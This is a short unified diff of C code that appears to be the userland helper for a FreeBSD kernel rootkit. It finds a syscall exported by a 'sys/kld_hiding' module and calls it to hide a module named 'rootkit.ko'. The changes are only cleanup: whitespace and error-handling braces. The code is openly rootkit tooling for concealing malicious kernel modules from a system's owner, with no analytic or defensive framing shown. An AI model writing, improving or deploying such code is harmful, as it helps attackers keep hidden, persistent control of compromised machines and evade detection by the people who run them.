@@ -19,7 +19,7 @@ find_syscall(const char *module_name)
     }
 
     memset(&module_stat, 0, sizeof(module_stat));
-    
+
     module_stat.version = sizeof(module_stat);
     if (modstat(module_id, &module_stat) == -1) {
         perror("modstat");
@@ -35,9 +35,9 @@ main(void)
     int hide_module_syscall;
 
     hide_module_syscall = find_syscall("sys/kld_hiding");
-    if (hide_module_syscall == -1)
-        perror("find_syscall");
+    if (hide_module_syscall == -1) {
         return 1;
+    }
 
     if (syscall(hide_module_syscall, "rootkit.ko") == -1) {
         perror("hide rootkit.ko");
